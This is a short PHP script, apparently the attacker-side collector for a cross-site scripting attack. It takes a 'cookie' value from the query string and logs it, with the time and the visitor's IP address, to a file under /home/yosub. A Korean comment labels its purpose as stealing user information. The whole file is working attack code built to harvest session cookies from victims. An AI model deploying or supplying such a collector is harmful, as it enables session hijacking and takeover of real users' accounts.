<?php
$cookie=$_GET[cookie];
$time=date("y-m-d H:i:s");
$server=$_SERVER['REMOTE_ADDR'];
$log=fopen("/home/yosub/cookie.txt", "a");
// 사용자 정보 탈취
fwrite($log, $time." ".$server." ".$cookie."\r\n");
fclose($log);
?>

